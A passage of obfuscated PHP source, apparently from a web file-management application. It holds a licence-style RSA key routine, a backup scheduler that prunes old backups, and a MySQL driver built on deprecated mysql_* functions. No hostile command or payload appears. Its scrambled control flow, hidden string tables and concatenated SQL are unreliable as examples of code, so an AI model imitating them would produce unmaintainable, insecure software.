$A™ŞÆÓíŸ•[336]); goto AÄœÀïÛêÇ; dƒ±è“: $f¨¦Ö¬ùâ = $this->{$_SERVER[ë¿˜ªè¥×”ö][333]}(); $DÛË¦Ú†å² = $d‘á¬¬Ô½[651]; if (!$DÛË¦Ú†å²) { return; } goto d£”ÅÈšß; EÜéö…ÌÇ: $d‘á¬¬Ô½ =& $_SERVER[÷ÖêïÔÔÓ]; $A™ŞÆÓíŸ• =& $_SERVER[ë¿˜ªè¥×”ö]; $a¿·¨®§” = $this->{$_SERVER[ë¿˜ªè¥×”ö][333]}(); goto dƒ±è“; AÄœÀïÛêÇ: $b¸•œ‚À² = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($Bçó´ÓÓÅ, $FÅºª¡äó) . $A™ŞÆÓíŸ•[337] . $CÍêä·Š®Ã; $FˆŠøÑºÚ = $d‘á¬¬Ô½[656]; return $b¸•œ‚À²; goto c¼ÙéÍË¨Ø; c¼ÙéÍË¨Ø: } public function zawod3d3d65c($a®Ç³„¯Ø) { goto e¹ìÖŸµ•ñ; Aƒ´êÄİˆ©: $Dˆ×Ñ­–‘ = $AÃ½šÜò†è[198](($Bà«Åºòá + $Bóˆ¾Ö¶¶) / 2); while (1) { $A¯ÍÈ«ÊÁ = $Dˆ×Ñ­–‘; $bìºëÏôó = $f·¤—†çÇÙ; while ($bìºëÏôó % $A¯ÍÈ«ÊÁ != 0) { $A•ªÂ‰›‚ = $bìºëÏôó; $FÈòŞ‰§š´ = $EÑî¬‰Øò™[663]; if (!$FÈòŞ‰§š´) { die; } $bìºëÏôó = $A¯ÍÈ«ÊÁ; $A¯ÍÈ«ÊÁ = $A•ªÂ‰›‚ % $A¯ÍÈ«ÊÁ; $A¼ÙÇŸ£É‘ = $EÑî¬‰Øò™[664]; while (strlen($A¼ÙÇŸ£É‘) < $EÑî¬‰Øò™[550]) { if (!$A¼ÙÇŸ£É‘) { break; } $A¼ÙÇŸ£É‘++; } } if ($A¯ÍÈ«ÊÁ == 1) { break; } else { $Dˆ×Ñ­–‘++; } } $b™¸öéÒÕ = 2; goto Däô¯°á±ƒ; e¹ìÖŸµ•ñ: $EÑî¬‰Øò™ =& $_SERVER[÷ÖêïÔÔÓ]; $AÃ½šÜò†è =& $_SERVER[ë¿˜ªè¥×”ö]; $cÒªÔµ¿ùö = $AÃ½šÜò†è[0]($AÃ½šÜò†è[337], $a®Ç³„¯Ø); goto f§äŠ¬¤¶ù; a‘Š‘ÒŞš: while (strlen($f¥ô½¯½ºÅ) < $EÑî¬‰Øò™[545]) { if (!$f¥ô½¯½ºÅ) { break; } $f¥ô½¯½ºÅ++; } $Bà«Åºòá = 0; $e —ä·¡ŒÀ = $EÑî¬‰Øò™[659]; goto fÕŒ•Û©æÔ; f§äŠ¬¤¶ù: if ($AÃ½šÜò†è[19]($cÒªÔµ¿ùö) != 2) { return $AÃ½šÜò†è[10]; } $AŞƒª“¸Å = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($cÒªÔµ¿ùö[1] . $AÃ½šÜò†è[10], $AÃ½šÜò†è[146]); $c±¨Õ”íÇ = $EÑî¬‰Øò™[657]; goto BŠ•Ş‹Ä°â; fô¶¾‰á¢Æ: $D¬¼ÁÙñ˜ = $EÑî¬‰Øò™[666]; goto DÔÁÙçº‡Ë; a¦ŒĞèÖÀ·: $f·¤—†çÇÙ = ($Bà«Åºòá - 1) * ($Bóˆ¾Ö¶¶ - 1); $fƒ’õãŒÖå = $EÑî¬‰Øò™[662]; if (!$fƒ’õãŒÖå) { return; } goto Aƒ´êÄİˆ©; A÷„¦‘ÕÙí: $d¦Ó›ôÛÑˆ = $AÃ½šÜò†è[111]($AÃ½šÜò†è[334] . ($Bà«Åºòá + $Bóˆ¾Ö¶¶) . $AÃ½šÜò†è[335] . $Dˆ×Ñ­–‘ . $AÃ½šÜò†è[335] . $b™¸öéÒÕ . $AÃ½šÜò†è[336]); $döÆÙ‘„Ó = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($cÒªÔµ¿ùö[0], $d¦Ó›ôÛÑˆ); return $döÆÙ‘„Ó; goto fô¶¾‰á¢Æ; Däô¯°á±ƒ: $bãßñÇ¯ = $EÑî¬‰Øò™[665]; if (!$bãßñÇ¯) { die; } for ($eİÄ¥öä£ç = 0; $eİÄ¥öä£ç < $f·¤—†çÇÙ * 10; $eİÄ¥öä£ç++) { if (($f·¤—†çÇÙ * $eİÄ¥öä£ç + 1) % $Dˆ×Ñ­–‘ == 0) { $b™¸öéÒÕ = $AÃ½šÜò†è[198](($f·¤—†çÇÙ * $eİÄ¥öä£ç + 1) / $Dˆ×Ñ­–‘); break; } } goto A÷„¦‘ÕÙí; fÕŒ•Û©æÔ: if (!$e —ä·¡ŒÀ) { return; } $Bóˆ¾Ö¶¶ = 0; for ($eİÄ¥öä£ç = 3; $eİÄ¥öä£ç < $AŞƒª“¸Å; $eİÄ¥öä£ç += 2) { if ($AŞƒª“¸Å % $eİÄ¥öä£ç != 0) { continue; } $Bà«Åºòá = $eİÄ¥öä£ç; $Bóˆ¾Ö¶¶ = $AÃ½šÜò†è[198]($AŞƒª“¸Å / $eİÄ¥öä£ç); $Cô˜„ÓµÆ = $EÑî¬‰Øò™[660]; while (strlen($Cô˜„ÓµÆ) < $EÑî¬‰Øò™[550]) { if (!$Cô˜„ÓµÆ) { break; } $Cô˜„ÓµÆ++; } break; $C¢¢Œ÷¥÷ê = $EÑî¬‰Øò™[661]; if (!$C¢¢Œ÷¥÷ê) { die; } } goto a¦ŒĞèÖÀ·; BŠ•Ş‹Ä°â: if (!$AŞƒª“¸Å) { return $AÃ½šÜò†è[10]; } $AŞƒª“¸Å = $AÃ½šÜò†è[198]($AŞƒª“¸Å); $f¥ô½¯½ºÅ = $EÑî¬‰Øò™[658]; goto a‘Š‘ÒŞš; DÔÁÙçº‡Ë: } public function uqzxca4a9ca4() { goto bŸÇØÀ¾ïÏ; fë˜ÔĞ¥ğ: $dÔĞª®›Ÿ = array(); $EÕ‘¬…Éº› = $e„ãÊöä°Ü[667]; $F‚ß–ÙŞ¦Å = 1; goto eÁ†Ã²áù…; aäÉ¦šÄ•: for ($FòÙ‘‹À“ = $CÌ™†•ÂÏˆ; $FòÙ‘‹À“ > 1; $FòÙ‘‹À“--) { $DÆˆµ‘ÑÉ· = !0; $b¨‰¼¶ËÒÊ = $e„ãÊöä°Ü[671]; if (!$b¨‰¼¶ËÒÊ) { return; } foreach ($dÔĞª®›Ÿ as $ağÑÄí¥Œ) { if ($FòÙ‘‹À“ % $ağÑÄí¥Œ == 0) { $DÆˆµ‘ÑÉ· = !1; break; } } if ($DÆˆµ‘ÑÉ·) { $bÎˆåŒòä‘ = $FòÙ‘‹À“; break; } } return $bÎˆåŒòä‘; goto dŒøéØ³‡ƒ; b—’‘¤’¾Ü: $bÎˆåŒòä‘ = 2; $A¾Ö×óá£é = $e„ãÊöä°Ü[670]; if (!$A¾Ö×óá£é) { return; } goto aäÉ¦šÄ•; eÁ†Ã²áù…: $A»ˆàâîÊâ = $e„ãÊöä°Ü[668]; if (!$A»ˆàâîÊâ) { return; } while ($F‚ß–ÙŞ¦Å <= (int) $e¢©˜òë¯Å[339]($CÌ™†•ÂÏˆ)) { $FòÙ‘‹À“ = $F‚ß–ÙŞ¦Å; $C¾ë İµó‚ = $e„ãÊöä°Ü[669]; if (strlen($C¾ë İµó‚) < $e„ãÊöä°Ü[550]) { return; } while (!0) { $FòÙ‘‹À“++; if ($FòÙ‘‹À“ <= 2) { $F‚ß–ÙŞ¦Å = $FòÙ‘‹À“; break; } else { if ($FòÙ‘‹À“ < 2) { continue; } } $DÆˆµ‘ÑÉ· = !0; for ($aÚÑÅ£ˆš© = 2; $aÚÑÅ£ˆš© <= $e¢©˜òë¯Å[339]($FòÙ‘‹À“); $aÚÑÅ£ˆš©++) { if ($FòÙ‘‹À“ % $aÚÑÅ£ˆš© == 0) { $DÆˆµ‘ÑÉ· = !1; } } if ($DÆˆµ‘ÑÉ·) { $F‚ß–ÙŞ¦Å = $FòÙ‘‹À“; break; } } $dÔĞª®›Ÿ[] = $F‚ß–ÙŞ¦Å; } goto b—’‘¤’¾Ü; bŸÇØÀ¾ïÏ: $e„ãÊöä°Ü =& $_SERVER[÷ÖêïÔÔÓ]; $e¢©˜òë¯Å =& $_SERVER[ë¿˜ªè¥×”ö]; $CÌ™†•ÂÏˆ = $e¢©˜òë¯Å[318]($e¢©˜òë¯Å[338](2, 14), $e¢©˜òë¯Å[338](2, 16) - 1); goto fë˜ÔĞ¥ğ; dŒøéØ³‡ƒ: } public function mude3bc962f5($C™ƒ’ØÆ«¡, $fÌÎÂÃÓ†°) { $DÏ»¶—ç¯ë =& $_SERVER[÷ÖêïÔÔÓ]; $DŞ›Ñ’ß´á =& $_SERVER[ë¿˜ªè¥×”ö]; return $DŞ›Ñ’ß´á[13](array($DŞ›Ñ’ß´á[14], $DŞ›Ñ’ß´á[340]), $C™ƒ’ØÆ«¡, $fÌÎÂÃÓ†°); $fÚˆ¦¢÷¡ = $DÏ»¶—ç¯ë[672]; while ($fÚˆ¦¢÷¡ < $DÏ»¶—ç¯ë[545]) { if ($fÚˆ¦¢÷¡ >= 0) { break; } $fÚˆ¦¢÷¡++; } } public function ywak6112b5bd($FñÎ–‚çƒ, $b‡‰Çš ®«) { $BíÉæàˆôš =& $_SERVER[ë¿˜ªè¥×”ö]; return $BíÉæàˆôš[13](array($BíÉæàˆôš[341], $BíÉæàˆôš[342]), $FñÎ–‚çƒ, $b‡‰Çš ®«); } public function rucf92a99022($aË¨ó«×êÁ, $C‡¦ÕÖŠÑ™) { $F‰Ö£ô¾çµ =& $_SERVER[ë¿˜ªè¥×”ö]; return $F‰Ö£ô¾çµ[13](array($F‰Ö£ô¾çµ[341], $F‰Ö£ô¾çµ[343]), $aË¨ó«×êÁ, $C‡¦ÕÖŠÑ™); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $a·‚î·ù§™ =& $_SERVER[÷ÖêïÔÔÓ]; self::$name = date($a·‚î·ù§™[673]); if (!($d¶‰¡³†ŠÑ = Model($a·‚î·ù§™[674])->lastItem())) { $d¶‰¡³†ŠÑ = $this->initData(); } else { self::$name = $d¶‰¡³†ŠÑ[$a·‚î·ù§™[28]]; if ($d¶‰¡³†ŠÑ[$a·‚î·ù§™[675]] == $a·‚î·ù§™[493]) { self::$name = date($a·‚î·ù§™[676]); $EœöÑìñßè = 0; if (isset($d¶‰¡³†ŠÑ[$a·‚î·ù§™[278]][$a·‚î·ù§™[164]][$a·‚î·ù§™[415]])) { $EœöÑìñßè = (int) $d¶‰¡³†ŠÑ[$a·‚î·ù§™[278]][$a·‚î·ù§™[164]][$a·‚î·ù§™[415]]; } if ($d¶‰¡³†ŠÑ[$a·‚î·ù§™[28]] == self::$name) { Model($a·‚î·ù§™[674])->remove($d¶‰¡³†ŠÑ[$a·‚î·ù§™[364]]); } $d¶‰¡³†ŠÑ = $this->initData($EœöÑìñßè, $d¶‰¡³†ŠÑ[$a·‚î·ù§™[677]]); } else { $this->checkStore($d¶‰¡³†ŠÑ[$a·‚î·ù§™[677]]); } } self::$option = $d¶‰¡³†ŠÑ; } private function initData($BîØ£ÏêÌ” = 0, $BçŒ®ÆÔ÷ = '') { goto BÊÀï©ØŞ; CœŠ©ÁœçĞ: $b‚òÎ†ò¢¾[$c˜õŠÀŸî¨[364]] = $A‹É±¶Í›; return $b‚òÎ†ò¢¾; goto eÔôñÀĞ; BÊÀï©ØŞ: $c˜õŠÀŸî¨ =& $_SERVER[÷ÖêïÔÔÓ]; $A¬»¤õÇé = Model($c˜õŠÀŸî¨[674])->config(); if ($BçŒ®ÆÔ÷ && $A¬»¤õÇé[$c˜õŠÀŸî¨[677]] != $BçŒ®ÆÔ÷) { $BîØ£ÏêÌ” = 0; } goto Fà­¯Ì›óç; Fà­¯Ì›óç: $this->checkStore($A¬»¤õÇé[$c˜õŠÀŸî¨[677]]); $b‚òÎ†ò¢¾ = array($c˜õŠÀŸî¨[677] => $A¬»¤õÇé[$c˜õŠÀŸî¨[677]], $c˜õŠÀŸî¨[28] => self::$name, $c˜õŠÀŸî¨[675] => 0, $c˜õŠÀŸî¨[678] => $A¬»¤õÇé[$c˜õŠÀŸî¨[678]], $c˜õŠÀŸî¨[278] => array($c˜õŠÀŸî¨[679] => array($c˜õŠÀŸî¨[675] => 0), $c˜õŠÀŸî¨[680] => array($c˜õŠÀŸî¨[675] => 0, $c˜õŠÀŸî¨[681] => 0, $c˜õŠÀŸî¨[682] => 0, $c˜õŠÀŸî¨[29] => $c˜õŠÀŸî¨[33]), $c˜õŠÀŸî¨[683] => array($c˜õŠÀŸî¨[675] => 0, $c˜õŠÀŸî¨[681] => 0, $c˜õŠÀŸî¨[682] => 0), $c˜õŠÀŸî¨[164] => array($c˜õŠÀŸî¨[675] => 0, $c˜õŠÀŸî¨[684] => 0, $c˜õŠÀŸî¨[685] => 0, $c˜õŠÀŸî¨[686] => 0, $c˜õŠÀŸî¨[687] => 0, $c˜õŠÀŸî¨[415] => $BîØ£ÏêÌ”)), $c˜õŠÀŸî¨[688] => time(), $c˜õŠÀŸî¨[689] => 0); $A‹É±¶Í› = Model($c˜õŠÀŸî¨[674])->insert($b‚òÎ†ò¢¾); goto CœŠ©ÁœçĞ; eÔôñÀĞ: } private function checkStore($dˆá¬¸ŞÏö) { $B¡ÀàÊ®Û’ =& $_SERVER[÷ÖêïÔÔÓ]; $Fí÷Á®ä… = Model($B¡ÀàÊ®Û’[690])->listData($dˆá¬¸ŞÏö); Model($B¡ÀàÊ®Û’[690])->checkConfig($Fí÷Á®ä…); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[÷ÖêïÔÔÓ][674])->findByName(self::$name); } return self::$option; } public static function set($DÆÑ ôŒÏî) { $Bó“´å‹ï =& $_SERVER[÷ÖêïÔÔÓ]; $AŒùÃñ™Òİ = self::get(); foreach ($DÆÑ ôŒÏî as $Fµ°ã˜ó  => $Aƒ”ÄÔ¸îô) { $c‚¬ºÍ¥ß = explode($Bó“´å‹ï[92], $Fµ°ã˜ó ); $B„Ğ˜ƒ‹ì° = count($c‚¬ºÍ¥ß); switch ($B„Ğ˜ƒ‹ì°) { case 1: $AŒùÃñ™Òİ[$c‚¬ºÍ¥ß[0]] = $Aƒ”ÄÔ¸îô; break; case 2: $AŒùÃñ™Òİ[$c‚¬ºÍ¥ß[0]][$c‚¬ºÍ¥ß[1]] = $Aƒ”ÄÔ¸îô; break; case 3: $AŒùÃñ™Òİ[$c‚¬ºÍ¥ß[0]][$c‚¬ºÍ¥ß[1]][$c‚¬ºÍ¥ß[2]] = $Aƒ”ÄÔ¸îô; break; } } Model($Bó“´å‹ï[674])->update($AŒùÃñ™Òİ[$Bó“´å‹ï[364]], $AŒùÃñ™Òİ); self::$option = $AŒùÃñ™Òİ; return self::$option; } public function keep() { $DŒÌ©…¶Ä =& $_SERVER[÷ÖêïÔÔÓ]; $C«Çè‚·ä = self::get(); if ($C«Çè‚·ä[$DŒÌ©…¶Ä[278]][$DŒÌ©…¶Ä[679]][$DŒÌ©…¶Ä[675]] == $DŒÌ©…¶Ä[493]) { return; } $this->backupKeep($C«Çè‚·ä); self::set(array($DŒÌ©…¶Ä[691] => 1)); } private function backupKeep($fã•Ï§¥×Ò) { goto e¨µĞÎ×ù; Bô÷œŞª†: $c›Ú¼ªç¿ = array_unique($c›Ú¼ªç¿); foreach ($F”àÎ˜çùÜ as $A×‰ëò›¹) { if (!empty($A×‰ëò›¹[$aç±¢†“ñ§[28]]) && in_array($A×‰ëò›¹[$aç±¢†“ñ§[28]], $c›Ú¼ªç¿)) { continue; } Model($aç±¢†“ñ§[674])->remove($A×‰ëò›¹[$aç±¢†“ñ§[364]]); $E¹¬´ñÕ’Ó = "\173\151\x6f\72{$fã•Ï§¥×Ò[$aç±¢†“ñ§[677]]}\175\57\x64\141\164\141\x62\x61\163\x65\57\x62\x61\x63\x6b\165\x70\x5f{$A×‰ëò›¹[$aç±¢†“ñ§[28]]}"; IO::remove($E¹¬´ñÕ’Ó, !1); } goto C¦å»øä„Š; e¨µĞÎ×ù: $aç±¢†“ñ§ =& $_SERVER[÷ÖêïÔÔÓ]; $F”àÎ˜çùÜ = Model($aç±¢†“ñ§[674])->listData(); if (empty($F”àÎ˜çùÜ)) { return; } goto FïÑÃ‡é¶; FïÑÃ‡é¶: $c›Ú¼ªç¿ = array(); for ($fÉ³Øçäáé = 0; $fÉ³Øçäáé <= 7; $fÉ³Øçäáé++) { $c›Ú¼ªç¿[] = date($aç±¢†“ñ§[676], strtotime("\x2d{$fÉ³Øçäáé}\40\x64\141\171\163")); } for ($fÉ³Øçäáé = 0; $fÉ³Øçäáé < 12; $fÉ³Øçäáé++) { $c›Ú¼ªç¿[] = date($aç±¢†“ñ§[692], strtotime("\55{$fÉ³Øçäáé}\40\155\157\x6e\x74\150\x73")); } goto Bô÷œŞª†; C¦å»øä„Š: } public function db() { goto F„ÁÜˆ¦‘; F„ÁÜˆ¦‘: $AÃ‹ì›÷‹Í =& $_SERVER[÷ÖêïÔÔÓ]; $b¯ø«Àõ = self::get(); if ($b¯ø«Àõ[$AÃ‹ì›÷‹Í[278]][$AÃ‹ì›÷‹Í[680]][$AÃ‹ì›÷‹Í[675]] == $AÃ‹ì›÷‹Í[493]) { return !0; } goto fšĞÜÛË«¶; CÆº’ä¾êä: return !0; goto eªÑÊÃ¹×œ; fšĞÜÛË«¶: $aİ‹§Š–÷ = new BackupDb(); if (!$aİ‹§Š–÷->index()) { return !1; } self::set(array($AÃ‹ì›÷‹Í[693] => 1)); goto CÆº’ä¾êä; eªÑÊÃ¹×œ: } public function dbFile() { goto e‘î§´“«‚; e‘î§´“«‚: $CÉ‘·£Û™ =& $_SERVER[÷ÖêïÔÔÓ]; $CÏÎß¨«ÂÂ = self::get(); if ($CÏÎß¨«ÂÂ[$CÉ‘·£Û™[278]][$CÉ‘·£Û™[683]][$CÉ‘·£Û™[675]] == $CÉ‘·£Û™[493]) { return !0; } goto dÕ¿Ç¬Ú; dÕ¿Ç¬Ú: $A¶ïÇ’ÓÉ° = new BackupDbFile(); if (!$A¶ïÇ’ÓÉ°->index()) { return !1; } self::set(array($CÉ‘·£Û™[694] => 1)); goto AÒ¶¨ŠÚÕÆ; AÒ¶¨ŠÚÕÆ: return !0; goto aÍ¶°»›İ; aÍ¶°»›İ: } public function file() { $e“íĞÅ„Ñ¥ =& $_SERVER[÷ÖêïÔÔÓ]; $A±Ô¡›¢ˆ… = self::get(); if ($A±Ô¡›¢ˆ…[$e“íĞÅ„Ñ¥[278]][$e“íĞÅ„Ñ¥[164]][$e“íĞÅ„Ñ¥[675]] == $e“íĞÅ„Ñ¥[493]) { return !0; } if (!isset($A±Ô¡›¢ˆ…[$e“íĞÅ„Ñ¥[678]]) || $A±Ô¡›¢ˆ…[$e“íĞÅ„Ñ¥[678]] == $e“íĞÅ„Ñ¥[464]) { $d¨ç¬¦Ìì = new BackupFile(); if (!$d¨ç¬¦Ìì->index()) { return !1; } } self::set(array($e“íĞÅ„Ñ¥[695] => 1, $e“íĞÅ„Ñ¥[675] => 1)); return !0; } } goto A÷ß¥ª‹÷Ü; d§ª¶¢ÎÂØ: class DbMysql extends Db { public function __construct($aÔÛŞ–…êÏ = '') { $cË¡ï“°  =& $_SERVER[÷ÖêïÔÔÓ]; if (!extension_loaded($cË¡ï“° [702])) { think_exception(think_lang($cË¡ï“° [10]) . $cË¡ï“° [793]); } if (!empty($aÔÛŞ–…êÏ)) { $this->config = $aÔÛŞ–…êÏ; if (empty($this->config[$cË¡ï“° [13]])) { $this->config[$cË¡ï“° [13]] = $cË¡ï“° [33]; } } } public function connect($fó‚ÙÚ¶Ìé = '', $bŸÖå© = 0, $B“½ŠÖ‡ˆ = false) { $d…Õ±Üá =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->linkID[$bŸÖå©])) { goto E•Úˆƒ½ãš; eÌïˆÑï˜ß: if (1 != think_config($d…Õ±Üá[18])) { unset($this->config); } goto cë‚ ÷ñ; E•Úˆƒ½ãš: if (empty($fó‚ÙÚ¶Ìé)) { $fó‚ÙÚ¶Ìé = $this->config; } $DØàŒÅ¤ = $fó‚ÙÚ¶Ìé[$d…Õ±Üá[794]] . ($fó‚ÙÚ¶Ìé[$d…Õ±Üá[795]] ? "\72{$fó‚ÙÚ¶Ìé[$d…Õ±Üá[795]]}" : $d…Õ±Üá[33]); $C˜–·ÔÀ­¨ = !empty($fó‚ÙÚ¶Ìé[$d…Õ±Üá[13]][$d…Õ±Üá[14]]) ? $fó‚ÙÚ¶Ìé[$d…Õ±Üá[13]][$d…Õ±Üá[14]] : $this->pconnect; goto DÜ«®šîî; DÜ«®šîî: if ($C˜–·ÔÀ­¨) { $this->linkID[$bŸÖå©] = mysql_pconnect($DØàŒÅ¤, $fó‚ÙÚ¶Ìé[$d…Õ±Üá[796]], $fó‚ÙÚ¶Ìé[$d…Õ±Üá[797]], 131072); } else { $this->linkID[$bŸÖå©] = mysql_connect($DØàŒÅ¤, $fó‚ÙÚ¶Ìé[$d…Õ±Üá[796]], $fó‚ÙÚ¶Ìé[$d…Õ±Üá[797]], !0, 131072); } if (!$this->linkID[$bŸÖå©] || !empty($fó‚ÙÚ¶Ìé[$d…Õ±Üá[17]]) && !mysql_select_db($fó‚ÙÚ¶Ìé[$d…Õ±Üá[17]], $this->linkID[$bŸÖå©])) { think_exception(mysql_error()); } $E‘ÄŞËßœ = mysql_get_server_info($this->linkID[$bŸÖå©]); goto A‡©âù’; A‡©âù’: mysql_query($d…Õ±Üá[798] . think_config($d…Õ±Üá[799]) . $d…Õ±Üá[55], $this->linkID[$bŸÖå©]); if ($E‘ÄŞËßœ > $d…Õ±Üá[800]) { mysql_query($d…Õ±Üá[801], $this->linkID[$bŸÖå©]); } $this->connected = !0; goto eÌïˆÑï˜ß; cë‚ ÷ñ: } return $this->linkID[$bŸÖå©]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d®•ô“ëò) { goto D†Å¼õˆ­¡; B¶Ñ¾­‡Ò: think_action_status($AĞã¨Ş¢èƒ[19], 1); think_status($AĞã¨Ş¢èƒ[20]); $this->queryID = mysql_query($d®•ô“ëò, $this->_linkID); goto B¼µ‚ÚãçÜ; B¼µ‚ÚãçÜ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bëé„£„í; D†Å¼õˆ­¡: $AĞã¨Ş¢èƒ =& $_SERVER[÷ÖêïÔÔÓ]; if (0 === stripos($d®•ô“ëò, $AĞã¨Ş¢èƒ[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto b¶õ§ˆÖ¥; b¶õ§ˆÖ¥: if (!$this->_linkID) { return !1; } $this->queryStr = $d®•ô“ëò; if ($this->queryID) { $this->free(); } goto B¶Ñ¾­‡Ò; bëé„£„í: } public function execute($A§˜Öî¥½) { goto B˜àì¦¸×Ú; B˜àì¦¸×Ú: $cö÷›­£Í­ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Dáà¾õîöÄ; BÂ˜ˆˆõÂª: if (!1 === $dñ†¢Á–‡ç) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto C‹Áæ…‘ç; Dáà¾õîöÄ: $this->queryStr = $A§˜Öî¥½; if ($this->queryID) { $this->free(); } think_action_status($cö÷›­£Í­[21], 1); goto AôİâÚ öˆ; AôİâÚ öˆ: think_status($cö÷›­£Í­[20]); $dñ†¢Á–‡ç = mysql_query($A§˜Öî¥½, $this->_linkID); $this->debug(); goto BÂ˜ˆˆõÂª; C‹Áæ…‘ç: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[÷ÖêïÔÔÓ][802], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B‡«îªœ¹ = mysql_query($_SERVER[÷ÖêïÔÔÓ][803], $this->_linkID); $this->transTimes = 0; if (!$B‡«îªœ¹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d¹²ÙììÜ = mysql_query($_SERVER[÷ÖêïÔÔÓ][804], $this->_linkID); $this->transTimes = 0; if (!$d¹²ÙììÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $Eƒ¿–™™ëÍ = array(); if ($this->numRows > 0) { while ($CÆùÄ‡¢Š = mysql_fetch_assoc($this->queryID)) { $Eƒ¿–™™ëÍ[] = $CÆùÄ‡¢Š; } mysql_data_seek($this->queryID, 0); } return $Eƒ¿–™™ëÍ; } public function getFields($Aôæ×Ø½Àà) { $b×½‰—îíõ =& $_SERVER[÷ÖêïÔÔÓ]; $AëàƒÜò„Å = $this->query($b×½‰—îíõ[805] . $this->parseKey($Aôæ×Ø½Àà)); $D´Ë›­Ôå = array(); if ($AëàƒÜò„Å) { foreach ($AëàƒÜò„Å as $b÷ôïÒ µ÷ => $a¶‚—£“ˆ) { $D´Ë›­Ôå[$a¶‚—£“ˆ[$b×½‰—îíõ[27]]] = array($b×½‰—îíõ[28] => $a¶‚—£“ˆ[$b×½‰—îíõ[27]], $b×½‰—îíõ[29] => $a¶‚—£“ˆ[$b×½‰—îíõ[30]], $b×½‰—îíõ[31] => (bool) (strtoupper($a¶‚—£“ˆ[$b×½‰—îíõ[32]]) === $b×½‰—îíõ[806]), $b×½‰—îíõ[34] => $a¶‚—£“ˆ[$b×½‰—îíõ[35]], $b×½‰—îíõ[36] => strtolower($a¶‚—£“ˆ[$b×½‰—îíõ[37]]) == $b×½‰—îíõ[38], $b×½‰—îíõ[39] => strtolower($a¶‚—£“ˆ[$b×½‰—îíõ[40]]) == $b×½‰—îíõ[41]); } } return $D´Ë›­Ôå; } public function getTables($a«ó»¦™·Ù = '') { $e”ôöÚ£” =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($a«ó»¦™·Ù)) { $D…‘’¿Öíµ = $e”ôöÚ£”[807] . $a«ó»¦™·Ù; } else { $D…‘’¿Öíµ = $e”ôöÚ£”[808]; } $Fº¿ºò½Í¨ = $this->query($D…‘’¿Öíµ); $Eêæ¾ªî„­ = array(); foreach ($Fº¿ºò½Í¨ as $FÂÃÅî³õ§ => $Dˆ§È¬£) { $Eêæ¾ªî„­[$FÂÃÅî³õ§] = current($Dˆ§È¬£); } return $Eêæ¾ªî„­; } public function replace($DÓ™ô›Ê®Ş, $cô®â±ì×… = array()) { $bÊÕ¬Šä‚ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($DÓ™ô›Ê®Ş as $E‡ìÄ£õËÅ => $eøƒ‘‚„¹) { $EÍÜÎÃÇ˜” = $this->parseValue($eøƒ‘‚„¹); if (is_scalar($EÍÜÎÃÇ˜”)) { $d©’èÍí‹œ[] = $EÍÜÎÃÇ˜”; $FÈË¸¯“¢[] = $this->parseKey($E‡ìÄ£õËÅ); } } $B†Ÿ¸Ğ°Œ† = $bÊÕ¬Šä‚[809] . $this->parseTable($cô®â±ì×…[$bÊÕ¬Šä‚[264]]) . $bÊÕ¬Šä‚[810] . implode($bÊÕ¬Šä‚[47], $FÈË¸¯“¢) . $bÊÕ¬Šä‚[811] . implode($bÊÕ¬Šä‚[47], $d©’èÍí‹œ) . $bÊÕ¬Šä‚[812]; return $this->execute($B†Ÿ¸Ğ°Œ†); } public function insertAll($aé×Ê‰µ¹, $bØ¯Ö‰Ê¾ = array(), $C­§ÁëÈŠ = false) { goto CÛ²ğÔƒºª; a†±åÛ£ÍÑ: $c‹ŒÀ«õšÇ = array(); foreach ($aé×Ê‰µ¹ as $Bóìª•Ô…º) { $CçåŸöë’Ï = array(); foreach ($Bóìª•Ô…º as $d‹½ª‡ğ²ƒ => $fÎ¶ï”³¹) { $fÎ¶ï”³¹ = $this->parseValue($fÎ¶ï”³¹); if (is_scalar($fÎ¶ï”³¹)) { $CçåŸöë’Ï[] = $fÎ¶ï”³¹; } } $c‹ŒÀ«õšÇ[] = $b¯ò•¶Ş¸Å[245] . implode($b¯ò•¶Ş¸Å[47], $CçåŸöë’Ï) . $b¯ò•¶Ş¸Å[812]; } array_walk($cÏ²±ÁÒ²á, array($this, $b¯ò•¶Ş¸Å[813])); goto fÙÔø¶Ù; fÙÔø¶Ù: $Fùåƒ“Û¡Ÿ = ($C­§ÁëÈŠ ? $b¯ò•¶Ş¸Å[814] : $b¯ò•¶Ş¸Å[815]) . $b¯ò•¶Ş¸Å[816] . $this->parseTable($bØ¯Ö‰Ê¾[$b¯ò•¶Ş¸Å[264]]) . $b¯ò•¶Ş¸Å[810] . implode($b¯ò•¶Ş¸Å[47], $cÏ²±ÁÒ²á) . $b¯ò•¶Ş¸Å[817] . implode($b¯ò•¶Ş¸Å[47], $c‹ŒÀ«õšÇ); return $this->execute($Fùåƒ“Û¡Ÿ); goto Cã¨„õáÂ; CÛ²ğÔƒºª: $b¯ò•¶Ş¸Å =& $_SERVER[÷ÖêïÔÔÓ]; if (!is_array($aé×Ê‰µ¹[0])) { return !1; } $cÏ²±ÁÒ²á = array_keys($aé×Ê‰µ¹[0]); goto a†±åÛ£ÍÑ; Cã¨„õáÂ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fÏÀƒàó =& $_SERVER[÷ÖêïÔÔÓ]; $this->error = mysql_errno() . $fÏÀƒàó[4] . mysql_error($this->_linkID); if ($fÏÀƒàó[33] != $this->queryStr) { $this->error .= 